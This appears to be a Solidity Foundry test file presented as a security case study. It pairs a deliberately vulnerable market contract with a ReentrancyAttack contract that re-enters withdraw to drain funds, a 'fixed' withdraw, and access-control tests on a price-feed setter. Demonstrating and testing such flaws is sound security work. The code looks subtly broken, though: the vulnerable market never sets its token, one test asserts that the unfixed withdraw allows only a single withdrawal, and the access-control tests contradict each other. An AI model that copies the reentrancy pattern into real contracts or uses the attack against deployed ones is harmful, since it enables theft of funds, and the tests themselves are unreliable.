pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import "../../src/core/PredictionMarket.sol";
import "../../src/core/FeeVault.sol";
import "../../src/tokens/OutcomeToken.sol";
import "../../src/mock/MockUSDC.sol";
import "../../src/mock/MockAggregator.sol";
import "../../src/oracles/ChainlinkPriceFeed.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract VulnerableMarket {
    using SafeERC20 for IERC20;

    IERC20 public baseToken;
    mapping(address => uint256) public balances;

    function deposit(uint256 amount) external {
        baseToken.safeTransferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        (bool success, ) = msg.sender.call{value: 0}("");
        require(success, "call failed");
        balances[msg.sender] = 0;
        baseToken.safeTransfer(msg.sender, bal);
    }

    function withdrawFixed() external {
        uint256 bal = balances[msg.sender];
        balances[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: 0}("");
        require(success, "call failed");
        baseToken.safeTransfer(msg.sender, bal);
    }
}

contract ReentrancyAttack {
    VulnerableMarket public market;
    bool public attackDone;

    constructor(VulnerableMarket _market) {
        market = _market;
    }

    receive() external payable {
        if (!attackDone) {
            attackDone = true;
            market.withdraw();
        }
    }

    function attack() external {
        market.withdraw();
    }
}

contract SecurityCaseStudyTest is Test {
    function test_ReentrancyBeforeFix() public {
        VulnerableMarket vmkt = new VulnerableMarket();
        MockUSDC usdc = new MockUSDC();
        usdc.transfer(address(vmkt), 1000e6);

        ReentrancyAttack attacker = new ReentrancyAttack(vmkt);

        usdc.transfer(address(attacker), 100e6);
        vm.startPrank(address(attacker));
        usdc.approve(address(vmkt), 100e6);
        vmkt.deposit(100e6);
        usdc.approve(address(vmkt), 0);
        vm.stopPrank();

        uint256 attackerBalBefore = usdc.balanceOf(address(attacker));
        uint256 marketBalBefore = usdc.balanceOf(address(vmkt));

        attacker.attack();

        uint256 attackerAfter = usdc.balanceOf(address(attacker));
        uint256 marketAfter = usdc.balanceOf(address(vmkt));

        assertGt(attackerAfter - attackerBalBefore, 100e6, "Reentrancy should drain more than deposited");
        assertLt(marketAfter, marketBalBefore - 100e6, "Market should lose extra funds");
    }

    function test_ReentrancyAfterFix() public {
        VulnerableMarket vmkt = new VulnerableMarket();
        MockUSDC usdc = new MockUSDC();
        usdc.transfer(address(vmkt), 1000e6);

        usdc.transfer(address(this), 100e6);
        usdc.approve(address(vmkt), 100e6);
        vmkt.deposit(100e6);

        uint256 balBefore = usdc.balanceOf(address(this));
        vmkt.withdrawFixed();
        uint256 balAfter = usdc.balanceOf(address(this));
        assertEq(balAfter - balBefore, 100e6);
    }

    function test_ReentrancyFixPreventsDoubleWithdraw() public {
        VulnerableMarket vmkt = new VulnerableMarket();
        MockUSDC usdc = new MockUSDC();
        usdc.transfer(address(vmkt), 1000e6);

        ReentrancyAttack attacker = new ReentrancyAttack(vmkt);

        usdc.transfer(address(attacker), 100e6);
        vm.startPrank(address(attacker));
        usdc.approve(address(vmkt), 100e6);
        vmkt.deposit(100e6);
        vm.stopPrank();

        uint256 balBefore = usdc.balanceOf(address(attacker));
        attacker.attack();
        uint256 balAfter = usdc.balanceOf(address(attacker));

        assertEq(balAfter - balBefore, 100e6, "Fixed version should only allow one withdraw");
    }

    function test_AccessControlOnPrivilegedFunction() public {
        MockUSDC usdc = new MockUSDC();
        MockAggregator agg = new MockAggregator(2000e8);
        ChainlinkPriceFeed feed = new ChainlinkPriceFeed(address(agg), 3600);

        vm.prank(address(0xBAD));
        vm.expectRevert();
        feed.setAggregator(address(0));
    }

    function test_NoAccessControlVulnerability() public {
        MockAggregator agg = new MockAggregator(2000e8);
        ChainlinkPriceFeed feed = new ChainlinkPriceFeed(address(agg), 3600);

        feed.setAggregator(address(0x123));
        feed.setStalenessThreshold(5000);
        assertEq(address(feed.aggregator()), address(0x123));
    }
}
